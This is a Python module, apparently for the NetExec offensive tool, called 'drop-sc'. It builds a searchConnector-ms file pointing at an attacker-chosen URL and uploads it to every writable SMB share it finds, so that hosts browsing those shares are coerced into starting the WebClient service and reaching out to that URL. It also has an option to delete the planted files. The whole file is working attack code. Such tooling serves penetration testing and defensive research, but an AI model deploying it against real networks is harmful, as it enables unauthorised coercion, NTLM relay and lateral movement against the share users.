import ntpath
import tempfile


class NXCModule:
    """
    Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.
    https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/
    Module by @zblurx
    """

    name = "drop-sc"
    description = "Drop a searchConnector-ms file on each writable share"
    supported_protocols = ["smb"]

    def options(self, context, module_options):
        """
        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.
        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/
        Module by @zblurx
        URL         URL in the searchConnector-ms file, default https://rickroll
        CLEANUP     Cleanup (choices: True or False)
        SHARE       Specify a share to target
        FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it's automatically added), default is "Documents"
        """
        self.cleanup = False
        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])

        self.url = "https://rickroll"
        if "URL" in module_options:
            self.url = str(module_options["URL"])

        self.sharename = ""
        if "SHARE" in module_options:
            self.sharename = str(module_options["SHARE"])

        self.filename = "Documents"
        if "FILENAME" in module_options:
            self.filename = str(module_options["FILENAME"])

        self.file_path = ntpath.join("\\", f"{self.filename}.searchConnector-ms")
        if not self.cleanup:
            self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.searchConnector-ms"
            with open(self.scfile_path, "w") as scfile:
                scfile.truncate(0)
                scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
                scfile.write("<searchConnectorDescription" ' xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">') # noqa ISC001
                scfile.write("<description>Microsoft Outlook</description>")
                scfile.write("<isSearchOnlyItem>false</isSearchOnlyItem>")
                scfile.write("<includeInStartMenuScope>true</includeInStartMenuScope>")
                scfile.write(f"<iconReference>{self.url}/0001.ico</iconReference>")
                scfile.write("<templateInfo>")
                scfile.write("<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>")
                scfile.write("</templateInfo>")
                scfile.write("<simpleLocation>")
                scfile.write(f"<url>{self.url}</url>")
                scfile.write("</simpleLocation>")
                scfile.write("</searchConnectorDescription>")

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            context.log.debug(f"Share: {share}")
            if "WRITE" in share["access"] and (share["name"] == self.sharename if self.sharename != "" else share["name"] not in ["C$", "ADMIN$"]):
                context.log.success(f"Found writable share: {share['name']}")
                if not self.cleanup:
                    with open(self.scfile_path, "rb") as scfile:
                        try:
                            connection.conn.putFile(share["name"], self.file_path, scfile.read)
                            context.log.success(f"[OPSEC] Created {self.filename}.searchConnector-ms file on the {share['name']} share")
                        except Exception as e:
                            context.log.fail(f"Error writing {self.filename}.searchConnector-ms file on the {share['name']} share: {e}")
                else:
                    try:
                        connection.conn.deleteFile(share["name"], self.file_path)
                        context.log.success(f"Deleted {self.filename}.searchConnector-ms file on the {share['name']} share")
                    except Exception as e:
                        context.log.fail(f"[OPSEC] Error deleting {self.filename}.searchConnector-ms file on share {share['name']}: {e}")
